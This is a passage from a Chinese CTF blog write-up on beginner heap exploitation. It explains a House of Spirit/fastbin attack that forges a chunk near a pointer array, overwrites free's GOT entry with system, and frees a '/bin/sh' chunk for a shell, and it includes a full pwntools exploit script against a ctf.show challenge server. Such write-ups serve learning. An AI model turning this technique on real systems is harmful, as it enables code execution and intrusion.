class="number">0</span>,<span class="number">8</span>,p64(<span class="number">114515</span>))</span><br><span class="line"></span><br><span class="line">get_flag()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><strong>House Of Spirit</strong></p>
<p>创建三个chunk,free chunk2,链入fastbin,edit修改chunk1内容，并且覆盖到free chunk2的fd,fd就可以覆盖为fake chunk.</p>
<p>我们在heaparray附近伪造chunk,为了绕过free fastbins的大小检查，在附近找到0x7f,可以调试找到合适的地方：0x602090 -3，并把这里作fake chunk,size就是0x7f.</p>
<p>创建一个chunk,分配到chunk2</p>
<p>再创建一个chunk3,分配到fakechunk,</p>
<p>edit修改chunk3,覆盖到heaparray，写入free_got</p>
<p>再修改heaparray[0],把free_got改为system_plt的地址</p>
<p>这里需要一个’&#x2F;bin&#x2F;sh\x00’，可以在开始修chunk1的时候写入</p>
<p>释放chunk1,”&#x2F;bin&#x2F;sh\x00”当作参数传入free(),free已改为system,实际执行system(“&#x2F;bin&#x2F;sh\0x00”)，然后get shell</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28227</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bit/libc/64bit/libc-2.23.so&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">heaparray_0 = <span class="number">0x6020c0</span></span><br><span class="line">heaparray_1 = <span class="number">0x6020c8</span></span><br><span class="line">heaparray_2 = <span class="number">0x6020d0</span></span><br><span class="line">heaparray_3 = <span class="number">0x6020d8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size,content</span>):</span><br><span class="line">            io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">            io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">            io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">            io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_heap</span>(<span class="params">idx</span>):</span><br><span class="line">            io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">            io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">            io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x68</span>,<span class="string">&#x27;aaaa&#x27;</span>)                                                   </span><br><span class="line">create_heap(<span class="number">0x68</span>,<span class="string">&#x27;bbbb&#x27;</span>)                                                  </span><br><span class="line">create_heap(<span class="number">0x68</span>,<span class="string">&#x27;cccc&#x27;</span>)                                            </span><br><span class="line">delete_heap(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0x71</span>) + p64(<span class="number">0x602090</span>-<span class="number">3</span>)</span><br><span class="line">edit_heap(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">create_heap(<span class="number">0x68</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">create_heap(<span class="number">0x68</span>,<span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;\xaa&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(free_got)</span><br><span class="line">edit_heap(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(system)</span><br><span class="line"></span><br><span class="line">edit_heap(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete_heap(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>看到这也许你会觉得看的一脸懵，实际上在堆利用来说，往往比栈更加复杂多变，攻击方式也更加多样，以上几题仅仅为入门题，解题的方式也只会比我写出来的多。</p>

        </div>

        
            <section class="post-copyright">
                
                
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/pwn-WP/"># pwn_WP</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2025/03/04/pwn%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">pwn环境搭建</a>
            
            
            <a class="next" rel="next" href="/2025/03/04/pwn%E5%85%A5%E9%97%A8%EF%BC%8891-110%EF%BC%89/">pwn入门（91~110）</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Wi1lings | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>